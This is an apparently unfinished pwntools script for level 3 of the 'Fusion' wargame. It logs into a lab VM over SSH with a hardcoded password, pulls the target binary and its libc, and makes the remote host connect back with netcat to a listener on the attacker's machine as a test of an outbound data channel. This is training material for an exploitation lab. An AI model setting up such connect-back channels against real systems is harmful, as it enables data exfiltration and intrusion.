from pwn import *
from pwnhelper.dmesg import Dmesg
import threading

############################################################################################################################################################
# GET POST REQUEST FROM REMOTE PROCESS INTO LOCALLY LISTENING NC ON ETHERNET NIC
############################################################################################################################################################




############################################################################################################################################################
# METHOD DEFINITIONS
############################################################################################################################################################


local_dir = None
remote_binary = None
cloned_binary = None
libc = None
port = None
elf = None


def connect(level):
    global remote_binary
    global local_dir
    global cloned_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/fusion/level"+level
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = local_dir+remote_binary
    port = "200"+level
    s = ssh("fusion", "192.168.2.129", password="godmode", cache=True)
    s.libs(remote_binary, local_dir)
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib/i386-linux-gnu/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s

############################################################################################################################################################
# SEND JSON PAYLOAD AND RECEIVE POST REQUEST
############################################################################################################################################################

listener_port = "4000"


s = connect("03")
dmesg = Dmesg(s)
guest_ip = "192.168.2.129"
host_ip = "192.168.2.111"


def start_receiving_nc():
    listener_nc = process(["nc", "-l", "-p", listener_port, guest_ip])
    while True:
        print("waiting for data")
        print(listener_nc.recv())


thread = threading.Thread(target=start_receiving_nc)
thread.start()
sleep(1)

print("sending data")
nc = s.process(["nc", host_ip, listener_port])
nc.sendline(b"AAAA")
print("sent")
